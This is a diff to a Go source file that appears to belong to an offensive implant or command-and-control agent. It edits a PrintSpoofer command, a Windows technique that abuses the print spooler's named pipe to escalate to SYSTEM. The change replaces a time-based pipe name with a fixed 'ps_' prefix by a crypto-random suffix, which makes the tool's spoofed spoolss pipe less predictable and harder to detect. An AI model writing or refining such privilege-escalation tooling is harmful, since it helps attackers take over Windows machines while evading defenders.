@@ -4,6 +4,8 @@
 package commands
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"runtime"
@@ -76,9 +78,9 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	// Generate a random pipe name suffix
-	var randBuf [8]byte
-	windows.GetSystemTimeAsFileTime((*windows.Filetime)(unsafe.Pointer(&randBuf)))
-	pipeSuffix := fmt.Sprintf("ps_%x", randBuf[4:8])
+	var randBuf [4]byte
+	_, _ = rand.Read(randBuf[:])
+	pipeSuffix := hex.EncodeToString(randBuf[:])
 
 	// Create the named pipe: \\.\pipe\{suffix}\pipe\spoolss
 	pipePath := fmt.Sprintf(`\\.\pipe\%s\pipe\spoolss`, pipeSuffix)
